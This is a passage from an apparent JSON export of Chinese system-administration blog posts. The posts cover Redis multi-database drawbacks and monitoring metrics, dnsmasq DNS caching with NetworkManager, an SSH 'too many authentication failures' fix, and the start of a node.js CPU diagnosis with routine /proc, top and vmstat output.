  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">不要将 redis 和 mysql 混为一谈</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n在接触 redis 之前，相信很多人都有 mysql 的使用经验。\n</p>\n\n<p>\nmysql 的实体分层由上至下依次是：\n</p>\n\n<ul class=\"org-ul\">\n<li>实例（instance）\n\n<p>\nmysqld 进程。\n</p>\n</li>\n\n<li>库（database）\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>表（table）\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>记录（row）\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>字段（field）\n</li>\n</ul>\n\n\n<p>\nredis 的实体分层由上至下依次是：\n</p>\n\n<ul class=\"org-ul\">\n<li>实例（instance）\n\n<p>\nredis 进程。\n</p>\n</li>\n\n<li>库（database）\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>键值（Key-Value）\n</li>\n</ul>\n\n\n<p>\n我们很容易将 mysql 与 redis 的实例（instance）和库（database）等同起来，然而却大错特错。\n</p>\n\n<p>\n其实\n</p>\n\n<ul class=\"org-ul\">\n<li>redis 的实例（instance） 等同于 mysql 的库（database）\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>redis 的库（database） 等同于 mysql 的表（table）\n</li>\n</ul>\n</div>\n</div>\n\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">redis 的多库是鸡肋</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\nredis 是无预定义结构的（schema-less）数据库，表（table ）的存在意义不大，\n它更多地是做为命名空间（name space），由于使用的是很不友好的数字命名（默认 0-15），\nredis 中的 库（database）形同鸡肋。\n</p>\n\n<p>\n以下为 redis 作者的观点，引用自 <a href=\"https://groups.google.com/d/msg/redis-db/vS5wX8X4Cjg/8ounBXitG4sJ\">database names? - Google 网上论坛</a>\n</p>\n<blockquote>\n<p>\nI understand how this can be useful, but unfortunately I consider\nRedis multiple database errors my worst decision in Redis design at\nall&#x2026; without any kind of real gain, it makes the internals a lot\nmore complex. The reality is that databases don't scale well for a\nnumber of reason, like active expire of keys and VM. If the DB\nselection can be performed with a string I can see this feature being\nused as a scalable O(1) dictionary layer, that instead it is not.\n</p>\n\n<p>\nWith DB numbers, with a default of a few DBs, we are communication\nbetter what this feature is and how can be used I think. I hope that\nat some point we can drop the multiple DBs support at all, but I think\nit is probably too late as there is a number of people relying on this\nfeature for their work.\n</p>\n</blockquote>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">使用 redis 多库是妥协的结果</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n有一种观点认为不同的应用（app）使用不同的库（database）可以从而避免键命名冲突。\n</p>\n\n<p>\nredis 对于不同的库（database）没有提供任何隔离机制，完全依赖于应用（app）部署时约定使用不同的库（database）。\n</p>\n\n<p>\n为什么不约定应用（app）使用的所有键都加上应用（app）前缀，或者每个应用（app）使用不同的 redis 实例（instance）呢？\n</p>\n\n<p>\n从开发人员的角度来说\n</p>\n\n<ul class=\"org-ul\">\n<li>如果每个应用（app）使用不同的实例（instance），是最省事的，连接 redis 后，直接操作即可\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>如果每个应用（app）使用不同的库（database），略微麻烦一点，连接 redis 后，先执行一下 <code>select</code> <code>db</code> ，redis 客户端库会提供支持\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>如果每个应用（app）的键（key）都加上应用（app）前缀，会很麻烦，每一处访问 redis 的代码都要涉及\n</li>\n</ul>\n\n\n<p>\n从运维人员的角度来说\n</p>\n\n<ul class=\"org-ul\">\n<li>如果每个应用（app）使用不同的实例（instance），是最麻烦的，维护压力剧增，每个实例（instance）背后还要有配套的启动、停止脚本，监控，主备实例等\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>如果每个应用（app）使用不同的库（database），略微麻烦一点，分配并记录一下，告知开发人员使用指定的 redis 实例及库（database）\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>如果每个应用（app）的键（key）都加上应用（app）前缀，是最省事的，可以灵活地为应用（app）安排使用实例（instance）或库（database）\n</li>\n</ul>\n\n\n<p>\n不同的应用（app）使用不同的库（database）这一方案被采用，很可能是开发人员与运维人员互相妥协的结果。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">redis 的多库扩容难</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\nredis 的数据量或者请求数过高，会导致 redis 不稳定，最终影响服务质量。\n</p>\n\n<p>\n这时候就要考虑 redis 扩容了，需要将其中一个库（database）迁到新的实例（instance）上，过程如下：\n</p>\n\n<ul class=\"org-ul\">\n<li>停掉应用（app）\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>将应用（app）的 redis 库（database）同步到新的 redis 实例（instance）上\n\n<p>\n通过拷贝 <code>dump.rdb</code> 的方式同步（传输）数据，redis 实例（instance）上的所有库（database）数据都是混在一起的，\n其它应用（app）数据会增加数据同步（传输）时间及新 redis 实例（instance） 数据载入时间。\n</p>\n\n<p>\n如果通过工具在线将应用（app）的 redis 库（database）拷贝到运行中的新 redis 实例（instance）上，会很耗时，\n对本身负载就很高的 redis 添加更多压力，可能会影响其它应用（app）。\n</p>\n\n<p>\n新 redis 实例（instance）设置为旧 redis 实例（instance） 的 slave，同步完成后取消 Master-Slave 关系，\n这种方法相对更好一些。\n</p>\n</li>\n\n<li>启动新的 redis 实例\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>修改应用（app）配置指向新的 redis 实例\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>启动应用（app）\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>清除两个 redis 实例中的脏数据\n\n<p>\n<code>select</code> <code>db</code> ，然后执行 <code>flushdb</code> 命令即可，这可能是使用多库最大的好处。\n</p>\n</li>\n</ul>\n\n\n<p>\n应用（app）的停机时间（Down Time）肯定短不了。\n</p>\n\n\n<p>\n如果每个应用（app）使用不同的实例，需要将某个实例迁到新机器，则可以做到平滑扩容（迁移），过程如下：\n</p>\n\n<ul class=\"org-ul\">\n<li>应用（app）使用 redis sentinel 方式访问 redis\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>新机器部署 redis 新实例\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>新实例设置为旧 redis 实例的 slave\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>同步完成后进行 Master-Slave 换位\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>应用（app）会自动切到新的 redis 实例\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>旧的 redis 实例可以停掉\n</li>\n</ul>\n</div>\n</div>\n\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<ul class=\"org-ul\">\n<li><a href=\"http://stackoverflow.com/questions/16221563/whats-the-point-of-multiple-redis-databases\">What's the Point of Multiple Redis Databases? - Stack Overflow</a>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li><a href=\"https://groups.google.com/d/msg/redis-db/vS5wX8X4Cjg/8ounBXitG4sJ\">database names? - Google 网上论坛</a>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li><a href=\"http://redis.io/topics/partitioning\">Partitioning: how to split data among multiple Redis instances. – Redis</a>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li><a href=\"http://oldblog.antirez.com/post/redis-presharding.html\">Redis Presharding</a>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "redis 的关键度量要素",
  "timestamp": "2016-04-14 22:40:00",
  "tags": [
    "redis"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">redis 进程的 CPU 占用率</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\nredis 采用单线程模型，只能利用一个核，监控一定要到进程级，对于一台 16 核机器，redis CPU 占用 100%，但是机器的 CPU 占用很可能不到 10%。\n</p>\n\n<p>\nredis 进程的 CPU 占用率过高的时候是很脆弱的，额外出现的负载就很可能导致整个服务不可用，而且难以恢复，需要为 redis 减负（优化、功能降级）或扩容（更好的机器、更多的机器）。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">机器的内存使用率</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\nredis 持久化数据到磁盘时，会 fork 出一个子进程，子进程负责写盘。\n</p>\n\n<p>\n理想情况下，redis 父进程从 fork 返回到子进程完成写盘这段时间内，父进程未进行任何内存变更，由于 Copy-On-Write 机制的存在，子进程共享父进程的内存空间。\n</p>\n\n<p>\n然而真实情况往往是另一个极端，redis 做为随机读写的内存数据库，父进程会瞬间在所有内存页上进行写操作，需要多一倍的内存空间占用。\n</p>\n\n<p>\n存盘时物理内存不足导致动用交换空间（Swap），整个机器都会不稳定。\n</p>\n\n<p>\n所以跑 redis 的机器，空闲内存量至少要达到 redis 进程的内存占用量。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">fork 行为</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\nredis 在进行 bgsave 或者 aof-rewrite 时，写盘（阻塞式操作）由 fork 出的子进程执行，不影响主进程的响应时间。\n</p>\n\n<p>\n但是 fork 是由主进程调用的，在某些环境（如：虚拟机）下耗时会比较长，可能导致 redis 服务的响应时间变长。\n</p>\n\n<p>\nfork、bgsave 或 aof-rewrite 耗时以及频率需要监控并保留历史记录，当它们升高时，redis 服务将周期性地出现响应时间变长、吞吐量下降，是重要的预警信号。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<ul class=\"org-ul\">\n<li><a href=\"https://blog.newrelic.com/2015/05/11/redis-performance-metrics/\">Understanding Redis Performance: The 7 Metrics</a>\n</li>\n\n<li><a href=\"http://redis.io/topics/latency\">Redis latency problems troubleshooting – Redis</a>\n</li>\n\n<li><a href=\"http://blog.csdn.net//chenleixing/article/details/50530419\">Redis上踩过的一些坑-美团</a>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "使用 dnsmasq 进行 DNS 缓存注意事项",
  "timestamp": "2016-04-21 17:45:00",
  "tags": [
    "linux",
    "dns"
  ],
  "body": "<p>\ndnsmasq 不仅能做域名解析结果缓存，它本身就是 dns 服务器。\n</p>\n\n<p>\n修改 <code>dnsmasq.conf</code>\n</p>\n<pre class=\"example\">\n<span id=\"coderef-dnsmasq_listen_local\" class=\"coderef-off\"><span class=\"linenr\">1: </span>listen-address=127.0.0.1</span>\n<span id=\"coderef-dnsmasq_interface_lo\" class=\"coderef-off\"><span class=\"linenr\">2: </span>interface=lo</span>\n<span id=\"coderef-dnsmasq_bind_interfaces\" class=\"coderef-off\"><span class=\"linenr\">3: </span>bind-interfaces</span>\n<span id=\"coderef-dnsmasq_disable_authoritative\" class=\"coderef-off\"><span class=\"linenr\">4: </span>#dhcp-authoritative</span>\n<span id=\"coderef-dnsmasq_strict_order\" class=\"coderef-off\"><span class=\"linenr\">5: </span>strict-order</span>\n<span id=\"coderef-dnsmasq_no_negcache\" class=\"coderef-off\"><span class=\"linenr\">6: </span>no-negcache</span>\n</pre>\n\n<ul class=\"org-ul\">\n<li>行 <a href=\"#coderef-dnsmasq_listen_local\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-dnsmasq_listen_local');\" onmouseout=\"CodeHighlightOff(this, 'coderef-dnsmasq_listen_local');\">1</a> <a href=\"#coderef-dnsmasq_interface_lo\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-dnsmasq_interface_lo');\" onmouseout=\"CodeHighlightOff(this, 'coderef-dnsmasq_interface_lo');\">2</a> <a href=\"#coderef-dnsmasq_bind_interfaces\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-dnsmasq_bind_interfaces');\" onmouseout=\"CodeHighlightOff(this, 'coderef-dnsmasq_bind_interfaces');\">3</a> <a href=\"#coderef-dnsmasq_disable_authoritative\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-dnsmasq_disable_authoritative');\" onmouseout=\"CodeHighlightOff(this, 'coderef-dnsmasq_disable_authoritative');\">4</a>\n\n<p>\n只对本机提供服务，避免网络内的其它机器访问。\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>行 <a href=\"#coderef-dnsmasq_strict_order\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-dnsmasq_strict_order');\" onmouseout=\"CodeHighlightOff(this, 'coderef-dnsmasq_strict_order');\">5</a>\n\n<p>\ndnsmasq 并行向所有上游域名服务器请求解析域名，采用最快返回的解析结果。\n</p>\n\n<p>\n由于上游服务器列表是从网络环境中获取，可能获取到有问题的域名服务器（立即返回无法解析域名），导致域名解析总是失败，如下所示：\n</p>\n<pre class=\"example\">\n$ nslookup www.baidu.com\n\n\nServer:    127.0.0.1\nAddress 1: 127.0.0.1 localhost.lan\n\nnslookup: can't resolve 'www.baidu.com': Name or service not known\n</pre>\n\n<p>\n<code>strict-order</code> 配置项指定按域名服务器在配置文件（由 <code>resolv-file</code> 配置项指定，默认为 <code>/etc/resolv.conf</code> ）中出现的顺序依次解析，\n第一个域名服务器配置正确就能够避免这个问题。\n</p>\n</li>\n</ul>\n\n\n<ul class=\"org-ul\">\n<li>行 <a href=\"#coderef-dnsmasq_no_negcache\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-dnsmasq_no_negcache');\" onmouseout=\"CodeHighlightOff(this, 'coderef-dnsmasq_no_negcache');\">6</a>\n\n<p>\n当上游域名服务器返回找不到域名（no such domain）时，不缓存结果。</p>\n</li>\n</ul>\n"
},
{
  "title": "使用 dnsmasq 缓存域名解析结果加快上网速度",
  "timestamp": "2016-04-21 19:44:00",
  "tags": [
    "linux",
    "dns"
  ],
  "body": "<ul class=\"org-ul\">\n<li>安装 dnsmasq\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S dnsmasq\n</pre>\n</div>\n</li>\n\n<li>配置 NetworkManager\n\n<p>\nNetworkManager 包含 dnsmasq 插件，可以很方便地支持 dns 缓存。\n</p>\n\n<p>\n修改 <code>/etc/NetworkManager/NetworkManager.conf</code>\n</p>\n<pre class=\"example\">\ndns=dnsmasq\n</pre>\n\n<p>\n参考 <a href=\"https://wiki.archlinux.org/index.php/dnsmasq#NetworkManager\">dnsmasq - ArchWiki</a>\n</p>\n</li>\n\n<li>配置 dnsmasq\n\n<p>\nNetworkManager 将 dnsmasq 的配置存放在其它位置。\n</p>\n\n<p>\n<code>/etc/NetworkManager/dnsmasq.d/dnsmasq.conf</code>\n</p>\n<pre class=\"example\">\nlisten-address=127.0.0.1\nbind-interfaces\ndhcp-authoritative\nno-negcache\nstrict-order\n</pre>\n\n<p>\n参考 《<a href=\"http://blog.kankanan.com/article/4f7f7528-dnsmasq-8fdb884c-dns-7f135b586ce8610f4e8b9879.html\">使用 dnsmasq 进行 DNS 缓存注意事项</a>》\n</p>\n</li>\n\n<li>生效配置\n\n<p>\n重启 NetworkManager 正式生效配置\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl restart NetworkManager\n</pre>\n</div>\n\n<p>\ndnsmasq 不要通过 systemd 以服务方式启动，它会由 NetworkManager 启动\n</p>\n<pre class=\"example\">\n$ COLUMNS=400 ps wax | grep dnsmasq\n 6072 ?        S      0:00 /usr/bin/dnsmasq --no-resolv --keep-in-foreground --no-hosts --bind-interfaces --pid-file=/var/run/NetworkManager/dnsmasq.pid --listen-address=127.0.0.1 --conf-file=/var/run/NetworkManager/dnsmasq.conf --cache-size=400 --proxy-dnssec --conf-dir=/etc/NetworkManager/dnsmasq.d\n</pre>\n\n<p>\n上游域名服务器在 <code>/var/run/NetworkManager/dnsmasq.conf</code> 中指定，通常由 dhcp 服务分配。\n</p>\n\n<p>\n添加其它域名服务器，在 <code>/etc/NetworkManager/dnsmasq.d/dnsmasq.conf</code> 中添加以下配置：\n</p>\n<pre class=\"example\">\nserver=114.114.114.114\n</pre>\n\n<p>\n输出日志调试 dnsmasq ，在 <code>/etc/NetworkManager/dnsmasq.d/dnsmasq.conf</code> 中添加以下配置：\n</p>\n<pre class=\"example\">\nlog-facility=/var/log/dnsmasq.log\nlog-queries\n</pre>\n\n<p>\n重启 NetworkManager 生效。\n</p>\n</li>\n\n<li>看看效果\n\n<p>\n多次执行下面的命令，可以感觉到后几次明显比第一次快，这就是 DNS 缓存在起作用。\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">nslookup www.baidu.com\n</pre>\n</div>\n</li>\n\n<li>与 pdnsd 比较\n\n<p>\n之前写过一篇《 <a href=\"http://blog.kankanan.com/article/4f7f7528-pdnsd-7f135b5857df540d89e367907ed3679c52a05feb4e0a7f51901f5ea6.html\">使用Pdnsd缓存域名解析结果加快上网速度</a> 》，本篇改用 dnsmasq 实现，可以发现 dnsmasq 和 NetworkManager 集成度很高，即插即用，\n而 pdnsd 则要手动做很多设置，而且很难实现自动使用 dhcp 分配的域名服务器做为上游域名服务器。</p>\n</li>\n</ul>\n"
},
{
  "title": "解决 ssh 登录总是提示认证失败次数过多的问题",
  "timestamp": "2016-04-24 17:08:00",
  "tags": [
    "linux",
    "security"
  ],
  "body": "<p>\n服务器需要 vpn 才能进行 ssh 访问，但是周末在家突然 ssh 登录不上了，如下所示：\n</p>\n<pre class=\"example\">\n$ ssh tangxinfa@xxxx.xxxxxx.xxx\nReceived disconnect from xxx.xxx.xxx.xxx port 22:2: Too many authentication failures for tangxinfa\nConnection to xxxx.xxxxxx.xxx closed by remote host.\nConnection to xxxx.xxxxxx.xxx closed.\n</pre>\n\n<p>\n找运维人员咨询，说有可能是 openvpn 运行后设置的路由有问题，ssh 登录没有走 vpn ，建议重建 vpn 连接或重启机器。\n但是重启机器后还是一样，在 windows 下使用 openvpn ，通过 pietty 却可以正常 ssh 登录上服务器。\n</p>\n\n<p>\n网上搜索了一下，找到一个有关的帖子\n</p>\n<blockquote>\n<p>\nThis is usually caused by inadvertently offering multiple ssh keys to the server. The server will reject any key after too many keys have been offered.\n</p>\n\n<p>\nYou can see this for yourself by adding the -v flag to your ssh command to get verbose output. You will see that a bunch of keys are offered, until the server rejects the connection saying: \"Too many authentication failures for [user]\". Without verbose mode, you will only see the ambiguous message \"Connection reset by peer\".\n</p>\n\n<p>\nTo prevent irrelevant keys from being offered, you have to explicitly specify this in every host entry in the ~/.ssh/config file by adding IdentitiesOnly like so:\n</p>\n\n<p>\nHost www.somehost.com\n    IdentityFile ~/.ssh/key_for_somehost_rsa\n    IdentitiesOnly yes\n    Port 22\n</p>\n</blockquote>\n<p>\n引用自《<a href=\"http://superuser.com/questions/187779/too-many-authentication-failures-for-username\">ssh - Too many authentication failures for <b>username</b> - Super User</a>》\n</p>\n\n<p>\n也就是说，ssh 登录时会使用系统上的公匙依次进行认证，如果公私匙对数量超过服务器登录失败次数限制，就会出现上面提到的问题。\n</p>\n\n<p>\n为了登录 github 及内部的 gitlab，我创建了不同的 rsa 公私匙对，算上系统默认的公私匙对，达到三对\n</p>\n<pre class=\"example\">\n$ tree ~/.ssh\n/home/tangxinfa/.ssh\n├── github_id_rsa\n├── github_id_rsa.pub\n├── id_rsa\n├── id_rsa.pub\n├── known_hosts\n├── gitlab_id_rsa\n└── gitlab_id_rsa.pub\n\n0 directories, 7 files\n</pre>\n\n<p>\n当我们使用 ssh 登录服务器时，默认情况下会尝试使用公钥依次进行身份验证，如果还是失败则会使用密码进行登录\n</p>\n<pre class=\"example\">\n$ ssh -v tangxinfa@xxxx.xxxxxx.xxx\n...\ndebug1: Authentications that can continue: publickey,password\ndebug1: Next authentication method: publickey\ndebug1: Offering RSA public key: /home/tangxinfa/.ssh/id_rsa\ndebug1: Authentications that can continue: publickey,password\ndebug1: Offering RSA public key: github\ndebug1: Authentications that can continue: publickey,password\ndebug1: Offering RSA public key: gitlab\nReceived disconnect from xxx.xxx.xxx.xxx port 22:2: Too many authentication failures for tangxinfa\ndebug1: Authentication succeeded (publickey).\nAuthenticated to xxxx.xxxxxx.xxx ([xxx.xxx.xxx.xxx]:22).\ndebug1: channel 0: new [client-session]\ndebug1: Requesting no-more-sessions@openssh.com\ndebug1: Entering interactive session.\ndebug1: pledge: network\ndebug1: channel 0: free: client-session, nchannels 1\nConnection to xxxx.xxxxxx.xxx closed by remote host.\nConnection to xxxx.xxxxxx.xxx closed.\nTransferred: sent 3328, received 2776 bytes, in 0.1 seconds\nBytes per second: sent 59495.7, received 49627.4\ndebug1: Exit status -1\n</pre>\n\n<p>\n知道了问题的原因，解决方法就很多了，如：\n</p>\n\n<ul class=\"org-ul\">\n<li>调整 ssh 服务配置，调高失败次数限制\n</li>\n\n<li>调整 ssh 客户端配置，不使用公钥认证\n\n<p>\n可以在命令行选项中指定\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">ssh -o <span style=\"color: #ffcc66;\">PreferredAuthentications</span>=password tangxinfa@xxxx.xxxxxx.xxx\n</pre>\n</div>\n\n<p>\n也可以配置文件中指定\n<code>~/.ssh/config</code>\n</p>\n<pre class=\"example\">\nHost xxxx xxxx.xxxxxx.xxx\n     HostName xxxx.xxxxxx.xxx\n     User tangxinfa\n     PreferredAuthentications password\n</pre>\n</li>\n</ul>\n"
},
{
  "title": "诊断 node.js 应用 CPU 占用过高的问题",
  "timestamp": "2016-05-12 17:25:00",
  "tags": [
    "node",
    "linux"
  ],
  "body": "<p>\nnode.js 应用使用 pm2 进行管理，采用 cluster 模式，每台服务器运行 16 个 node.js 实例。\n</p>\n\n<p>\n应用的开销主要在网络上：\n</p>\n\n<p>\n平均每个 node.js 实例要维持来自嵌入式设备的约 3K TLS 长连接，平均每秒会有 30 个来自客户端的 HTTP 短连接。\n</p>\n\n<p>\nTLS 长连接上最多 45 秒会有一次心跳（发送 80 多字节，接收 400 多字节）。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">系统信息</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n</div><div id=\"outline-container-sec-1-1\" class=\"outline-3\">\n<h3 id=\"sec-1-1\"><code>CPU</code></h3>\n<div class=\"outline-text-3\" id=\"text-1-1\">\n<ul class=\"org-ul\">\n<li>逻辑 CPU 数：24 \n\n<pre class=\"example\">\n# cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c \n     24  Intel(R) Xeon(R) CPU E5-2620 v2 @ 2.10GHz\n</pre>\n</li>\n\n<li>物理 CPU 数：2\n\n<pre class=\"example\">\n# cat /proc/cpuinfo | grep 'physical id' | sort | uniq -c\n     12 physical id : 0\n     12 physical id : 1\n</pre>\n</li>\n\n<li>每个物理 CPU 的核数：6\n\n<pre class=\"example\">\n# cat /proc/cpuinfo | grep \"cpu cores\" | uniq | awk -F: '{print $2}'\n 6\n</pre>\n</li>\n\n<li>每个核超线程数：2\n\n<p>\n两个逻辑 CPU 具有相同的 <code>core id</code> 则超线程是打开的。\n</p>\n\n<pre class=\"example\">\n# cat /proc/cpuinfo | grep -E \"physical id|core id\" | sed -e ':a;N;$!ba;s/\\ncore id\\s*/       core id /g' | sort | uniq -c\n      2 physical id : 0       core id : 0\n      2 physical id : 0       core id : 1\n      2 physical id : 0       core id : 2\n      2 physical id : 0       core id : 3\n      2 physical id : 0       core id : 4\n      2 physical id : 0       core id : 5\n      2 physical id : 1       core id : 0\n      2 physical id : 1       core id : 1\n      2 physical id : 1       core id : 2\n      2 physical id : 1       core id : 3\n      2 physical id : 1       core id : 4\n      2 physical id : 1       core id : 5\n</pre>\n</li>\n</ul>\n\n<p>\n参考：<a href=\"http://blog.sina.com.cn/s/blog_4a6151550100iowl.html\">Linux CPU数量判断，通过/proc/cpuinfo._一沙一花_新浪博客</a>\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-1-2\" class=\"outline-3\">\n<h3 id=\"sec-1-2\"><code>内存</code></h3>\n<div class=\"outline-text-3\" id=\"text-1-2\">\n<p>\n<code>64G</code> 内存， <code>37.8G</code> 空闲内存\n</p>\n\n<pre class=\"example\">\n# cat /proc/meminfo\nMemTotal:       65916740 kB\nMemFree:        39663756 kB\nBuffers:          595424 kB\nCached:          7627876 kB\nSwapCached:            0 kB\nActive:         17368112 kB\nInactive:        6936088 kB\nActive(anon):   16002524 kB\nInactive(anon):    80820 kB\nActive(file):    1365588 kB\nInactive(file):  6855268 kB\nUnevictable:          32 kB\nMlocked:              32 kB\nSwapTotal:      20971512 kB\nSwapFree:       20971512 kB\nDirty:              1896 kB\nWriteback:             0 kB\nAnonPages:      16081968 kB\nMapped:            19596 kB\nShmem:              1624 kB\nSlab:            1087320 kB\nSReclaimable:     756368 kB\nSUnreclaim:       330952 kB\nKernelStack:        5272 kB\nPageTables:        64280 kB\nNFS_Unstable:          0 kB\nBounce:                0 kB\nWritebackTmp:          0 kB\nCommitLimit:    53929880 kB\nCommitted_AS:   17348828 kB\nVmallocTotal:   34359738367 kB\nVmallocUsed:      436016 kB\nVmallocChunk:   34324325464 kB\nHardwareCorrupted:     0 kB\nAnonHugePages:   2525184 kB\nHugePages_Total:       0\nHugePages_Free:        0\nHugePages_Rsvd:        0\nHugePages_Surp:        0\nHugepagesize:       2048 kB\nDirectMap4k:        4096 kB\nDirectMap2M:     2076672 kB\nDirectMap1G:    65011712 kB\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">系统状态</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n<code>top</code>\n</p>\n<pre class=\"example\">\n# top -n 1\ntop - 13:05:48 up 144 days, 20:52,  2 users,  load average: 2.86, 2.46, 2.78\nTasks: 476 total,  19 running, 457 sleeping,   0 stopped,   0 zombie\nCpu(s): 22.7%us,  1.2%sy,  0.0%ni, 75.0%id,  0.0%wa,  0.0%hi,  1.1%si,  0.0%st\nMem:  65916740k total, 26237540k used, 39679200k free,   595424k buffers\nSwap: 20971512k total,        0k used, 20971512k free,  7614508k cached\n\n   PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND          \n191463 nobody    20   0 1884m 981m 9.8m R 83.3  1.5  12337:09 node /usr/local  \n192063 nobody    20   0 1905m 1.0g 9.8m R 73.6  1.6  12320:35 node /usr/local  \n194450 nobody    20   0 1842m 937m 9.8m R 62.0  1.5  12060:56 node /usr/local  \n191515 nobody    20   0 1911m 1.0g 9.8m R 60.1  1.6  12308:13 node /usr/local  \n190881 nobody    20   0 1862m 957m 9.8m R 52.3  1.5  12257:46 node /usr/local  \n195178 nobody    20   0 1795m 891m 9.8m R 52.3  1.4  11647:01 node /usr/local  \n193068 nobody    20   0 1873m 970m 9.8m R 50.4  1.5  12144:28 node /usr/local  \n194523 nobody    20   0 1805m 902m 9.8m R 50.4  1.4  11948:57 node /usr/local  \n190790 nobody    20   0 1857m 951m 9.8m R 48.4  1.5  12174:59 node /usr/local  \n191609 nobody    20   0 1847m 945m 9.8m R 48.4  1.5  12203:47 node /usr/local  \n192946 nobody    20   0 1898m 993m 9.8m R 48.4  1.5  12224:41 node /usr/local  \n193029 nobody    20   0 1827m 924m 9.8m R 48.4  1.4  12291:51 node /usr/local  \n195276 nobody    20   0 1786m 883m 9.8m R 48.4  1.4  11659:07 node /usr/local  \n196001 nobody    20   0 1885m 981m 9.8m R 48.4  1.5  11428:22 node /usr/local  \n193725 nobody    20   0 1884m 978m 9.8m R 46.5  1.5  12336:34 node /usr/local  \n 80300 root      20   0  611m 454m 1152 R 44.6  0.7  26523:40 redis-server     \n195944 nobody    20   0 1815m 912m 9.8m R 44.6  1.4  11353:21 node /usr/local\n</pre>\n\n<p>\n<code>vmstat</code>\n</p>\n<pre class=\"example\">\n# vmstat 1\n|----+---+------+----------+--------+---------+----+----+----+-------+--------+-------+----+----+----+----+----|\n|  r | b | swpd |     free |   buff |   cache | si | so | bi |    bo |     in |    cs | us | sy | id | wa | st |\n|----+---+------+----------+--------+---------+----+----+----+-------+--------+-------+----+----+----+----+----|\n| 17 | 0 |    0 | 39769884 | 595424 | 7523076 |  0 |  0 |  0 |    71 |      0 |     0 | 23 |  2 | 75 |  0 |  0 |\n|  9 | 0 |    0 | 39763800 | 595424 | 7528200 |  0 |  0 |  0 |  5188 | 108347 | 21186 | 53 |  5 | 41 |  0 |  0 |\n| 17 | 0 |    0 | 39758360 | 595424 | 7534084 |  0 |  0 |  0 |  5272 | 106375 | 24054 | 49 |  5 | 45 |  0 |  0 |\n| 15 | 0 |    0 | 39753912 | 595424 | 7538236 |  0 |  0 |  0 |  5252 | 107669 | 23522 | 50 |  5 | 44 |  0 |  0 |\n| 12 | 0 |    0 | 39747588 | 595424 | 7544612 |  0 |  0 |  0 |  5304 | 108452 | 24290 | 49 |  5 | 46 |  0 |  0 |\n| 15 | 0 |    0 | 39742744 | 595424 | 7548076 |  0 |  0 |  0 |  5200 | 106615 | 25614 | 47 |  5 | 48 |  0 |  0 |\n| 13 | 0 |    0 | 39738224 | 595424 | 7552712 |  0 |  0 |  0 |  5092 | 101642 